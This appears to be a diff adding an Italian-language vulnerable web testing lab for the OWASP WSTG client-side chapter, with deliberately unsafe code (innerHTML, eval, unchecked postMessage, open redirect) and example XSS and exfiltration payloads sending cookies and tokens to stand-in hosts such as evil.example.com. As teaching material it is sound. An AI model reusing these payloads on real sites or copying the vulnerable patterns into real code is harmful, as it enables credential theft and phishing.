@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vulnerable Web Testing Lab – WSTG 4.11</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!--  NAVIGATION                                                 -->
+<!-- ════════════════════════════════════════════════════════════ -->
+<nav id="sidebar">
+  <h2>🛡️ WSTG 4.11</h2>
+  <ul>
+    <li><a href="#dom-xss">4.11.1 DOM-Based XSS</a></li>
+    <li><a href="#js-exec">4.11.2 JS Execution</a></li>
+    <li><a href="#html-inj">4.11.3 HTML Injection</a></li>
+    <li><a href="#url-redirect">4.11.4 URL Redirect</a></li>
+    <li><a href="#css-inj">4.11.5 CSS Injection</a></li>
+    <li><a href="#res-manip">4.11.6 Resource Manipulation</a></li>
+    <li><a href="#cors">4.11.7 CORS</a></li>
+    <li><a href="#flash">4.11.8 Cross Site Flashing</a></li>
+    <li><a href="#clickjack">4.11.9 Clickjacking</a></li>
+    <li><a href="#websocket">4.11.10 WebSockets</a></li>
+    <li><a href="#web-msg">4.11.11 Web Messaging</a></li>
+    <li><a href="#storage">4.11.12 Browser Storage</a></li>
+    <li><a href="#xssi">4.11.13 XSSI</a></li>
+  </ul>
+</nav>
+
+<main>
+  <header>
+    <h1>⚠️ Client-Side Vulnerability Lab</h1>
+    <p class="disclaimer">Solo per scopi didattici e di testing. Non usare in produzione.</p>
+  </header>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.1  DOM-Based Cross Site Scripting                -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="dom-xss">
+    <h2>4.11.1 – DOM-Based XSS</h2>
+    <p class="hint">Il valore del parametro <code>name</code> nell'URL viene inserito direttamente nel DOM tramite <code>innerHTML</code>.</p>
+    <p class="hint"><strong>Esempi:</strong></p>
+    <ul class="examples">
+      <li><code>?name=&lt;img src=x onerror=alert('XSS')&gt;</code> — tag immagine con handler</li>
+      <li><code>?name=&lt;svg onload=alert(document.domain)&gt;</code> — SVG onload</li>
+      <li><code>?name=&lt;details open ontoggle=alert(1)&gt;click&lt;/details&gt;</code> — evento ontoggle</li>
+      <li><code>?name=&lt;marquee onstart=alert(document.cookie)&gt;XSS&lt;/marquee&gt;</code> — tag obsoleto</li>
+      <li><code>?name=&lt;iframe srcdoc="&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;</code> — iframe srcdoc</li>
+    </ul>
+    <div class="lab-area">
+      <div id="domxss-output" class="output-box">Nessun input ricevuto.</div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>const params = new URLSearchParams(location.search);
+const name = params.get('name');
+if (name) {
+  document.getElementById('domxss-output').innerHTML = 'Ciao, ' + name;
+}</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.2  JavaScript Execution                          -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="js-exec">
+    <h2>4.11.2 – JavaScript Execution</h2>
+    <p class="hint">L'input dell'utente viene passato direttamente a <code>eval()</code>.</p>
+    <p class="hint"><strong>Esempi:</strong></p>
+    <ul class="examples">
+      <li><code>alert('JS Exec!')</code> — popup semplice</li>
+      <li><code>document.cookie</code> — leggi i cookie</li>
+      <li><code>document.location='https://evil.example.com?c='+document.cookie</code> — cookie stealing</li>
+      <li><code>fetch('/api/user').then(r=>r.text()).then(alert)</code> — esfiltrazione dati via fetch</li>
+      <li><code>new Image().src='https://evil.example.com/log?d='+localStorage.getItem('auth_token')</code> — exfil token</li>
+    </ul>
+    <div class="lab-area">
+      <input type="text" id="jsexec-input" placeholder="Inserisci un'espressione JS…">
+      <button onclick="jsExec()">Esegui</button>
+      <div id="jsexec-output" class="output-box"></div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>function jsExec() {
+  const code = document.getElementById('jsexec-input').value;
+  const result = eval(code);                   // ← VULNERABILE
+  document.getElementById('jsexec-output').textContent = 'Risultato: ' + result;
+}</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.3  HTML Injection                                 -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="html-inj">
+    <h2>4.11.3 – HTML Injection</h2>
+    <p class="hint">L'input viene inserito nel DOM usando <code>innerHTML</code> senza sanitizzazione.</p>
+    <p class="hint"><strong>Esempi:</strong></p>
+    <ul class="examples">
+      <li><code>&lt;h1 style="color:red"&gt;INIETTATO&lt;/h1&gt;</code> — heading iniettato</li>
+      <li><code>&lt;form action="https://evil.example.com"&gt;&lt;input name=user placeholder="Username"&gt;&lt;input type=password name=pw placeholder="Password"&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;</code> — phishing form</li>
+      <li><code>&lt;a href="javascript:alert(1)"&gt;Clicca qui per il premio!&lt;/a&gt;</code> — link malevolo</li>
+      <li><code>&lt;table&gt;&lt;tr&gt;&lt;td&gt;Nome&lt;/td&gt;&lt;td&gt;ADMIN&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</code> — sovrascrittura dati visivi</li>
+    </ul>
+    <div class="lab-area">
+      <textarea id="html-input" rows="3" placeholder="Inserisci HTML…"></textarea>
+      <button onclick="htmlInject()">Inietta</button>
+      <div id="html-output" class="output-box"></div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>function htmlInject() {
+  const html = document.getElementById('html-input').value;
+  document.getElementById('html-output').innerHTML = html;  // ← VULNERABILE
+}</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.4  Client-side URL Redirect                       -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="url-redirect">
+    <h2>4.11.4 – Client-side URL Redirect</h2>
+    <p class="hint">Il parametro <code>redirect</code> nell'URL viene usato per reindirizzare senza validazione.</p>
+    <p class="hint">Prova: <code>?redirect=https://evil.example.com</code></p>
+    <div class="lab-area">
+      <input type="text" id="redirect-input" placeholder="URL di destinazione…">
+      <button onclick="doRedirect()">Redirect</button>
+      <div id="redirect-output" class="output-box"></div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>const redir = new URLSearchParams(location.search).get('redirect');
+if (redir) { location.href = redir; }   // ← VULNERABILE: open redirect</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.5  CSS Injection                                  -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="css-inj">
+    <h2>4.11.5 – CSS Injection</h2>
+    <p class="hint">Il parametro <code>color</code> nell'URL viene inserito direttamente in uno <code>&lt;style&gt;</code>.</p>
+    <p class="hint"><strong>Esempi:</strong></p>
+    <ul class="examples">
+      <li><code>red;} body{background:red</code> — escape della regola + override sfondo</li>
+      <li><code>green;} *{display:none</code> — nascondi l'intera pagina (defacement)</li>
+      <li><code>blue;} body::after{content:'HACKED';font-size:5em;color:red;position:fixed;top:40%;left:30%</code> — defacement con pseudo-elemento</li>
+      <li><code>red;} input[value^="a"]{background:url('https://evil.example.com/?leak=a')}</code> — CSS exfil (attribute selector)</li>
+    </ul>
+    <div class="lab-area">
+      <input type="text" id="css-input" placeholder="Inserisci un colore CSS…" value="">
+      <button onclick="cssInject()">Applica</button>
+      <div id="css-target" class="output-box">Questo testo cambierà colore.</div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>function cssInject() {
+  const color = document.getElementById('css-input').value;
+  const style = document.createElement('style');
+  style.textContent = '#css-target { color: ' + color + '; }'; // ← VULNERABILE
+  document.head.appendChild(style);
+}</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.6  Client-side Resource Manipulation              -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="res-manip">
+    <h2>4.11.6 – Client-side Resource Manipulation</h2>
+    <p class="hint">L'attributo <code>src</code> di un'immagine e lo <code>href</code> di un link vengono controllati dall'URL.</p>
+    <p class="hint">Prova: <code>?img=https://evil.example.com/fake.png</code></p>
+    <div class="lab-area">
+      <input type="text" id="resource-input" placeholder="URL immagine…">
+      <button onclick="resourceManip()">Carica</button>
+      <div class="output-box">
+        <img id="resource-img" src="" alt="Immagine controllata dall'utente" style="max-width:300px; display:none;">
+        <p>Link: <a id="resource-link" href="#">Clicca qui</a></p>
+      </div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>function resourceManip() {
+  const url = document.getElementById('resource-input').value;
+  document.getElementById('resource-img').src = url;          // ← VULNERABILE
+  document.getElementById('resource-link').href = url;        // ← VULNERABILE
+}</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.7  CORS                                           -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="cors">
+    <h2>4.11.7 – Cross Origin Resource Sharing</h2>
+    <p class="hint">Il server risponde con <code>Access-Control-Allow-Origin: *</code> e <code>Allow-Credentials: true</code>.</p>
+    <p class="hint">Clicca per leggere dati sensibili dall'API.</p>
+    <div class="lab-area">
+      <button onclick="corsFetch()">Fetch /api/user</button>
+      <div id="cors-output" class="output-box"></div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>// server.js
+res.setHeader('Access-Control-Allow-Origin', '*');
+res.setHeader('Access-Control-Allow-Credentials', 'true');
+
+// Un attaccante su evil.com può fare:
+fetch('http://localhost:3000/api/user')
+  .then(r => r.json())
+  .then(data => {
+    // Dati sensibili ora accessibili cross-origin
+  });</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.8  Cross Site Flashing (Deprecato)                -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="flash">
+    <h2>4.11.8 – Cross Site Flashing</h2>
+    <p class="hint">Adobe Flash è deprecato (EOL dicembre 2020). Questa vulnerabilità è ormai storica.</p>
+    <div class="lab-area">
+      <div class="output-box">
+        <p>⚠️ Flash Player non è più supportato dai browser moderni.</p>
+        <p>Storicamente, file <code>.swf</code> potevano essere manipolati tramite parametri FlashVars
+           o tramite l'interfaccia <code>ExternalInterface</code> per eseguire JavaScript nel contesto della pagina host.</p>
+        <p>Esempio storico di URL vulnerabile:<br>
+          <code>http://example.com/player.swf?callback=javascript:alert('XSS')</code></p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.9  Clickjacking                                   -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="clickjack">
+    <h2>4.11.9 – Clickjacking</h2>
+    <p class="hint">Questa pagina non invia gli header <code>X-Frame-Options</code> né <code>Content-Security-Policy: frame-ancestors</code>,
+       quindi può essere inclusa in un <code>&lt;iframe&gt;</code> su un sito malevolo.</p>
+    <div class="lab-area">
+      <button onclick="clickjackDemo()">Mostra Demo Clickjacking</button>
+      <div id="clickjack-demo" style="display:none; margin-top:1rem;">
+        <p>Simulazione: il bottone "Elimina Account" è nascosto sotto "Vinci un premio!"</p>
+        <div style="position:relative; width:300px; height:60px;">
+          <button style="position:absolute; width:300px; height:60px; opacity:0.2; z-index:2; cursor:pointer;"
+                  onclick="alert('⚠️ Account eliminato! (simulazione)')">Elimina Account</button>
+          <button style="position:absolute; width:300px; height:60px; z-index:1; background:#4CAF50; color:white; font-size:1.1rem; border:none; cursor:pointer;">
+            🎁 Clicca per vincere un premio!</button>
+        </div>
+      </div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>// Il server NON invia questi header protettivi:
+// X-Frame-Options: DENY
+// Content-Security-Policy: frame-ancestors 'self'
+
+// Un attaccante può includere la pagina in un iframe:
+&lt;iframe src="http://localhost:3000" style="opacity:0.01"&gt;&lt;/iframe&gt;</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.10  WebSockets                                    -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="websocket">
+    <h2>4.11.10 – WebSockets</h2>
+    <p class="hint">Il server WebSocket accetta connessioni da qualsiasi origine e fa eco dei messaggi senza sanitizzazione.</p>
+    <p class="hint"><strong>Esempi di messaggi malevoli:</strong></p>
+    <ul class="examples">
+      <li><code>&lt;img src=x onerror=alert('WS-XSS')&gt;</code> — XSS via WebSocket</li>
+      <li><code>&lt;a href="javascript:alert(document.cookie)"&gt;Clicca&lt;/a&gt;</code> — link JS nel messaggio</li>
+      <li><code>&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;z-index:9999"&gt;HACKED&lt;/div&gt;</code> — overlay</li>
+    </ul>
+    <div class="lab-area">
+      <div style="display:flex; gap:.5rem;">
+        <input type="text" id="ws-input" placeholder="Messaggio (prova con <img src=x onerror=alert(1)>)">
+        <button onclick="wsSend()">Invia</button>
+        <button onclick="wsConnect()">Connetti</button>
+      </div>
+      <div id="ws-output" class="output-box" style="min-height:120px;"></div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>// Server: nessun controllo sull'Origin
+wss.on('connection', (ws) => {
+  ws.on('message', (data) => {
+    // Broadcast senza sanitizzazione
+    wss.clients.forEach(c => c.send(data.toString()));
+  });
+});
+
+// Client: inserimento diretto nel DOM
+ws.onmessage = (e) => {
+  outputDiv.innerHTML += e.data;  // ← VULNERABILE
+};</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.11  Web Messaging (postMessage)                   -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="web-msg">
+    <h2>4.11.11 – Web Messaging</h2>
+    <p class="hint">La pagina accetta <code>postMessage</code> da qualsiasi origine senza verificare <code>event.origin</code>.</p>
+    <p class="hint"><strong>Esempi (da incollare nella console del browser):</strong></p>
+    <ul class="examples">
+      <li><code>window.postMessage('&lt;b&gt;Iniettato!&lt;/b&gt;','*')</code> — HTML injection via postMessage</li>
+      <li><code>window.postMessage('&lt;img src=x onerror=alert(document.domain)&gt;','*')</code> — XSS via postMessage</li>
+      <li><code>window.postMessage('&lt;form action=https://evil.example.com&gt;&lt;input name=token&gt;&lt;button&gt;Invia&lt;/button&gt;&lt;/form&gt;','*')</code> — phishing form iniettato</li>
+    </ul>
+    <div class="lab-area">
+      <input type="text" id="msg-input" placeholder="Messaggio da inviare via postMessage…">
+      <button onclick="sendPostMessage()">Invia postMessage</button>
+      <div id="msg-output" class="output-box">In attesa di messaggi…</div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>window.addEventListener('message', function(event) {
+  // ⚠️ Nessun controllo su event.origin!
+  document.getElementById('msg-output').innerHTML = event.data;
+});</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.12  Browser Storage                               -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="storage">
+    <h2>4.11.12 – Browser Storage</h2>
+    <p class="hint">Dati sensibili salvati in <code>localStorage</code> e <code>sessionStorage</code> senza cifratura, accessibili da qualsiasi script nella stessa origine.</p>
+    <div class="lab-area">
+      <button onclick="storageDemo()">Salva Dati Sensibili</button>
+      <button onclick="storageRead()">Leggi Storage</button>
+      <button onclick="storageClear()">Pulisci</button>
+      <div id="storage-output" class="output-box"></div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>// Salvare dati sensibili in chiaro nel browser storage
+localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiJ9.secret');
+localStorage.setItem('user_password', 'P@ssw0rd123!');
+sessionStorage.setItem('credit_card', '4111-1111-1111-1111');
+
+// Qualsiasi script (anche iniettato via XSS) può leggere:
+const token = localStorage.getItem('auth_token');</code></pre>
+    </details>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <!--  4.11.13  Cross Site Script Inclusion (XSSI)            -->
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <section id="xssi">
+    <h2>4.11.13 – Cross Site Script Inclusion (XSSI)</h2>
+    <p class="hint">Il server espone dati sensibili come file JavaScript globale. Un attaccante può includerlo con <code>&lt;script src="…"&gt;</code> dal proprio sito.</p>
+    <div class="lab-area">
+      <button onclick="xssiDemo()">Carica /api/data.js</button>
+      <div id="xssi-output" class="output-box"></div>
+    </div>
+    <details><summary>Codice vulnerabile</summary>
+<pre><code>// Server serve dati sensibili come JS eseguibile:
+//   GET /api/data.js → var sensitiveData = { users: [...] };
+
+// Attaccante su evil.com:
+&lt;script src="http://localhost:3000/api/data.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+  // Ora sensitiveData è accessibile!
+  fetch('https://evil.com/steal?d=' + JSON.stringify(sensitiveData));
+&lt;/script&gt;</code></pre>
+    </details>
+  </section>
+
+</main>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!--  SCRIPTS                                                    -->
+<!-- ════════════════════════════════════════════════════════════ -->
+<script>
+/* ─── 4.11.1 DOM-Based XSS ──────────────────────────────── */
+(function () {
+  const params = new URLSearchParams(location.search);
+  const name = params.get('name');
+  if (name) {
+    document.getElementById('domxss-output').innerHTML = 'Ciao, ' + name; // VULN
+  }
+})();
+
+/* ─── 4.11.2 JavaScript Execution ────────────────────────── */
+function jsExec() {
+  const code = document.getElementById('jsexec-input').value;
+  try {
+    const result = eval(code); // VULN
+    document.getElementById('jsexec-output').textContent = 'Risultato: ' + result;
+  } catch (e) {
+    document.getElementById('jsexec-output').textContent = 'Errore: ' + e.message;
+  }
+}
+
+/* ─── 4.11.3 HTML Injection ──────────────────────────────── */
+function htmlInject() {
+  const html = document.getElementById('html-input').value;
+  document.getElementById('html-output').innerHTML = html; // VULN
+}
+
+/* ─── 4.11.4 Client-side URL Redirect ────────────────────── */
+(function () {
+  const redir = new URLSearchParams(location.search).get('redirect');
+  if (redir) {
+    document.getElementById('redirect-output').innerHTML =
+      '⚠️ Redirect verso: <a href="' + redir + '">' + redir + '</a> (automatico disabilitato per demo)';
+    // In un caso reale: location.href = redir;  // VULN
+  }
+})();
+
+function doRedirect() {
+  const url = document.getElementById('redirect-input').value;
+  if (url) {
+    document.getElementById('redirect-output').innerHTML =
+      '⚠️ Sarai reindirizzato a: <a href="' + url + '">' + url + '</a>';
+    // Decommentare per redirect reale:
+    // location.href = url;  // VULN
+  }
+}
+
+/* ─── 4.11.5 CSS Injection ───────────────────────────────── */
+(function () {
+  const color = new URLSearchParams(location.search).get('color');
+  if (color) {
+    document.getElementById('css-input').value = color;
+    const style = document.createElement('style');
+    style.textContent = '#css-target { color: ' + color + '; }'; // VULN
+    document.head.appendChild(style);
+  }
+})();
+
+function cssInject() {
+  const color = document.getElementById('css-input').value;
+  const style = document.createElement('style');
+  style.textContent = '#css-target { color: ' + color + '; }'; // VULN
+  document.head.appendChild(style);
+}
+
+/* ─── 4.11.6 Client-side Resource Manipulation ───────────── */
+(function () {
+  const imgUrl = new URLSearchParams(location.search).get('img');
+  if (imgUrl) {
+    document.getElementById('resource-input').value = imgUrl;
+    const img = document.getElementById('resource-img');
+    img.src = imgUrl; // VULN
+    img.style.display = 'block';
+    document.getElementById('resource-link').href = imgUrl; // VULN
+  }
+})();
+
+function resourceManip() {
+  const url = document.getElementById('resource-input').value;
+  const img = document.getElementById('resource-img');
+  img.src = url; // VULN
+  img.style.display = 'block';
+  document.getElementById('resource-link').href = url; // VULN
+}
+
+/* ─── 4.11.7 CORS ────────────────────────────────────────── */
+function corsFetch() {
+  fetch('/api/user')
+    .then(r => r.json())
+    .then(data => {
+      document.getElementById('cors-output').textContent = JSON.stringify(data, null, 2);
+    })
+    .catch(err => {
+      document.getElementById('cors-output').textContent = 'Errore: ' + err;
+    });
+}
+
+/* ─── 4.11.9 Clickjacking ───────────────────────────────── */
+function clickjackDemo() {
+  const demo = document.getElementById('clickjack-demo');
+  demo.style.display = demo.style.display === 'none' ? 'block' : 'none';
+}
+
+/* ─── 4.11.10 WebSockets ────────────────────────────────── */
+let ws = null;
+function wsConnect() {
+  if (ws && ws.readyState === WebSocket.OPEN) return;
+  ws = new WebSocket('ws://' + location.host);
+  ws.onopen = () => {
+    document.getElementById('ws-output').innerHTML = '<em>Connesso!</em><br>';
+  };
+  ws.onmessage = (event) => {
+    document.getElementById('ws-output').innerHTML += event.data + '<br>'; // VULN: innerHTML
+  };
+  ws.onclose = () => {
+    document.getElementById('ws-output').innerHTML += '<em>Disconnesso.</em><br>';
+  };
+}
+function wsSend() {
+  if (!ws || ws.readyState !== WebSocket.OPEN) { wsConnect(); return; }
+  const msg = document.getElementById('ws-input').value;
+  ws.send(msg);
+}
+
+/* ─── 4.11.11 Web Messaging ─────────────────────────────── */
+window.addEventListener('message', function (event) {
+  // VULN: nessun controllo su event.origin
+  document.getElementById('msg-output').innerHTML =
+    '<strong>Origine:</strong> ' + event.origin + '<br>' +
+    '<strong>Dati:</strong> ' + event.data; // VULN: innerHTML senza sanitizzazione
+});
+
+function sendPostMessage() {
+  const msg = document.getElementById('msg-input').value;
+  window.postMessage(msg, '*'); // VULN: target origin '*'
+}
+
+/* ─── 4.11.12 Browser Storage ────────────────────────────── */
+function storageDemo() {
+  localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.secret');
+  localStorage.setItem('user_password', 'P@ssw0rd123!');
+  localStorage.setItem('api_key', 'sk-live-4eC39HqLyjWDarjtT1zdp7dc');
+  sessionStorage.setItem('credit_card', '4111-1111-1111-1111');
+  sessionStorage.setItem('session_secret', 'a1b2c3d4e5f6');
+  document.getElementById('storage-output').textContent = '✅ Dati sensibili salvati in localStorage e sessionStorage!';
+}
+
+function storageRead() {
+  let out = '── localStorage ──\n';
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    out += key + ' = ' + localStorage.getItem(key) + '\n';
+  }
+  out += '\n── sessionStorage ──\n';
+  for (let i = 0; i < sessionStorage.length; i++) {
+    const key = sessionStorage.key(i);
+    out += key + ' = ' + sessionStorage.getItem(key) + '\n';
+  }
+  document.getElementById('storage-output').textContent = out || 'Storage vuoto.';
+}
+
+function storageClear() {
+  localStorage.clear();
+  sessionStorage.clear();
+  document.getElementById('storage-output').textContent = '🗑️ Storage pulito.';
+}
+
+/* ─── 4.11.13 XSSI ──────────────────────────────────────── */
+function xssiDemo() {
+  const script = document.createElement('script');
+  script.src = '/api/data.js';
+  script.onload = () => {
+    if (typeof sensitiveData !== 'undefined') {
+      document.getElementById('xssi-output').textContent =
+        '⚠️ Dati globali accessibili:\n' + JSON.stringify(sensitiveData, null, 2);
+    }
+  };
+  document.head.appendChild(script);
+}
+</script>
+</body>
+</html>
